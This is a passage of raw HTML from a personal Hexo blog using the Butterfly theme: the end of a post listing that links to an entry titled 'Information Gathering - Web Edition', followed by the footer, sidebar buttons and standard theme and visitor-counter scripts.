href="/2026/06/13/Information-Gathering-Web-Edition/" title="Information Gathering - Web Edition">Information Gathering - Web Edition</a><time datetime="2026-06-12T16:20:53.000Z" title="Created 2026-06-13 00:20:53">2026-06-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover1.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By ziddzide</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
